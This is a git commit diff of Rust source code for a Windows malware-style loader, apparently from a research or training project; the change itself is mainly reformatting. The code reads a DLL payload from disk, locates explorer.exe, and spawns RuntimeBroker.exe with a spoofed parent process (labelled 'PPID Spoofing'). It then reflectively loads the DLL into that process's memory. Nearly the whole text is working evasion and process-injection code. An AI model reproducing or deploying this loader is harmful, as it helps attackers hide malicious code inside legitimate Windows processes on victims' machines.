76b7be696a0b668e7a35a17e77da2ca3e98fbf6d
malware-unicorn <malwareunicorn@secured.org>
2022-05-08 16:57:04 -0700

    saving refactoring effort

--- src/main.rs
+++ src/main.rs
@@ -5,19 +5,21 @@ use std::fs::File;
 use std::io::Read;
 use winapi::ctypes::c_void;
 
-use winapi::um::tlhelp32::{ CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,
-    PROCESSENTRY32,Process32First,Process32Next};
-use winapi::um::processthreadsapi::{OpenProcess,DeleteProcThreadAttributeList};
-use winapi::um::winbase::{EXTENDED_STARTUPINFO_PRESENT,STARTUPINFOEXW};
-use winapi::um::processthreadsapi::{CreateProcessW, PROCESS_INFORMATION, 
-    ResumeThread,LPPROC_THREAD_ATTRIBUTE_LIST,InitializeProcThreadAttributeList,
-    UpdateProcThreadAttribute};
-use winapi::um::synchapi::Sleep;
-use winapi::shared::minwindef::{TRUE,FALSE,DWORD};
-use winapi::um::winnt::{PVOID,HANDLE,MAXIMUM_ALLOWED};
-use std::ffi::{OsStr, CStr};
-use std::os::windows::ffi::OsStrExt;
+use std::ffi::{CStr, OsStr};
 use std::mem;
+use std::os::windows::ffi::OsStrExt;
+use winapi::shared::minwindef::{DWORD, FALSE, TRUE};
+use winapi::um::processthreadsapi::{
+    CreateProcessW, InitializeProcThreadAttributeList, ResumeThread, UpdateProcThreadAttribute,
+    LPPROC_THREAD_ATTRIBUTE_LIST, PROCESS_INFORMATION,
+};
+use winapi::um::processthreadsapi::{DeleteProcThreadAttributeList, OpenProcess};
+use winapi::um::synchapi::Sleep;
+use winapi::um::tlhelp32::{
+    CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
+};
+use winapi::um::winbase::{EXTENDED_STARTUPINFO_PRESENT, STARTUPINFOEXW};
+use winapi::um::winnt::{HANDLE, MAXIMUM_ALLOWED, PVOID};
 
 struct ProcessInfo {
     p_handle: HANDLE,
@@ -30,12 +32,12 @@ fn get_file_as_byte_vec(filename: &String) -> Option<Vec<u8>> {
         Ok(file) => file,
         Err(_err) => return None,
     };
-    let metadata = match fs::metadata(&filename){
+    let metadata = match fs::metadata(&filename) {
         Ok(m) => m,
         Err(_err) => return None,
     };
     let mut buffer = vec![0; metadata.len() as usize];
-    match f.read(&mut buffer){
+    match f.read(&mut buffer) {
         Ok(_) => return Some(buffer),
         Err(_err) => return None,
     };
@@ -44,12 +46,12 @@ fn get_file_as_byte_vec(filename: &String) -> Option<Vec<u8>> {
 fn read_payload() -> Option<Vec<u8>> {
     println!("read_payload ...");
     let filename = String::from("dummy_dll.dll");
-    match get_file_as_byte_vec(&filename){
+    match get_file_as_byte_vec(&filename) {
         Some(buffer) => return Some(buffer),
         None => {
             println!("get_file_as_byte_vec failed");
-            return None
-        },
+            return None;
+        }
     };
 }
 
@@ -61,14 +63,14 @@ unsafe fn find_proc_by_name(_proc_name: &str) -> Option<HANDLE> {
     let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     let mut target_pid: DWORD = 0;
     if snapshot == (0 as winapi::um::winnt::HANDLE) {
-        return None
+        return None;
     }
     let mut pe32 = PROCESSENTRY32 {
         dwSize: mem::size_of::<PROCESSENTRY32>() as DWORD,
-        .. std::mem::zeroed::<PROCESSENTRY32>()
+        ..std::mem::zeroed::<PROCESSENTRY32>()
     };
     if Process32First(snapshot, &mut pe32) == 0 {
-        return None
+        return None;
     }
     loop {
         let process_name = pe32.szExeFile;
@@ -88,48 +90,40 @@ unsafe fn find_proc_by_name(_proc_name: &str) -> Option<HANDLE> {
     // OpenProcess
     let process_handle = OpenProcess(MAXIMUM_ALLOWED, FALSE, target_pid);
     if process_handle != 0 as PVOID {
-        return Some(process_handle)
+        return Some(process_handle);
     }
     None
 }
 
 // https://github.com/hniksic/rust-subprocess/blob/master/src/popen.rs
-unsafe fn create_runtime_process()->Option<ProcessInfo> {
-    let _runtime_str_path = OsStr::new(
-        "C:\\Windows\\System32\\RuntimeBroker.exe");
-    let runtime_str_arg = OsStr::new(
-        "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding");
-    let mut runtime_str_path_w = runtime_str_arg.encode_wide()
-        .chain(Some(0)).collect::<Vec<_>>();
+unsafe fn create_runtime_process() -> Option<ProcessInfo> {
+    let _runtime_str_path = OsStr::new("C:\\Windows\\System32\\RuntimeBroker.exe");
+    let runtime_str_arg = OsStr::new("C:\\Windows\\System32\\RuntimeBroker.exe -Embedding");
+    let mut runtime_str_path_w = runtime_str_arg
+        .encode_wide()
+        .chain(Some(0))
+        .collect::<Vec<_>>();
     let mut sinfo_ex: STARTUPINFOEXW = mem::zeroed();
     sinfo_ex.StartupInfo.cb = mem::size_of::<STARTUPINFOEXW>() as u32;
 
     // Find Explorer
-    let explorer_handle = match find_proc_by_name("explorer.exe"){
+    let explorer_handle = match find_proc_by_name("explorer.exe") {
         Some(handle) => handle,
         None => return None,
     };
     // PPID Spoofing
     // InitializeProcThreadAttributeList
     let mut lp_size: usize = 0;
-    InitializeProcThreadAttributeList(
-            std::ptr::null_mut(),
-            1,
-            0,
-            &mut lp_size,
-        );
+    InitializeProcThreadAttributeList(std::ptr::null_mut(), 1, 0, &mut lp_size);
     if lp_size == 0 {
         //println!("InitializeProcThreadAttributeList failed");
         return None;
     }
     let mut lp_attribute_list: Box<[u8]> = vec![0; lp_size].into_boxed_slice();
-    sinfo_ex.lpAttributeList = lp_attribute_list.as_mut_ptr()
-        .cast::<_>() as LPPROC_THREAD_ATTRIBUTE_LIST;
-    let mut success = InitializeProcThreadAttributeList(
-        sinfo_ex.lpAttributeList, 
-        1, 
-        0, 
-        &mut lp_size);
+    sinfo_ex.lpAttributeList =
+        lp_attribute_list.as_mut_ptr().cast::<_>() as LPPROC_THREAD_ATTRIBUTE_LIST;
+    let mut success =
+        InitializeProcThreadAttributeList(sinfo_ex.lpAttributeList, 1, 0, &mut lp_size);
     if success == 0 {
         //println!("InitializeProcThreadAttributeList 2 failed");
         return None;
@@ -141,7 +135,7 @@ unsafe fn create_runtime_process()->Option<ProcessInfo> {
     success = UpdateProcThreadAttribute(
         sinfo_ex.lpAttributeList,
         0,
-        0x20000, // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
+        0x20000,                  // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
         raw_pointer_mut as PVOID, // prochandle
         len_pvoid,
         std::ptr::null_mut(),
@@ -177,12 +171,12 @@ unsafe fn create_runtime_process()->Option<ProcessInfo> {
     );
     if ret == 0 {
         // panic!("Cannot create process: {}", Error::last_os_error());
-        return None
+        return None;
     }
     ResumeThread(pinfo.hThread);
     DeleteProcThreadAttributeList(sinfo_ex.lpAttributeList);
     Sleep(0x3E8);
-    let p_info = ProcessInfo{
+    let p_info = ProcessInfo {
         p_handle: pinfo.hProcess,
         _base_addr: 0,
     };
@@ -191,21 +185,25 @@ unsafe fn create_runtime_process()->Option<ProcessInfo> {
 
 fn main() {
     let mut data = match read_payload() {
-        Some(buffer)=> buffer,
+        Some(buffer) => buffer,
         None => {
             println!("failed to retrieve file data");
             return;
         }
     };
-    
-    let process_info = unsafe { match create_runtime_process(){
-        Some(pinfo) => pinfo,
-        None=>return,
-    }};
+
+    let process_info = unsafe {
+        match create_runtime_process() {
+            Some(pinfo) => pinfo,
+            None => return,
+        }
+    };
     //let handle = memory_loadlibary_remote(data.as_mut_ptr() as *mut c_void, data.len() as u32, NULL);
     let handle = _memory_loadlibary_remote(
-        data.as_mut_ptr() as *mut c_void, 
-        data.len() as u32, process_info.p_handle);
+        data.as_mut_ptr() as *mut c_void,
+        data.len() as u32,
+        process_info.p_handle,
+    );
     if handle == 0 {
         println!("loading failed");
     }
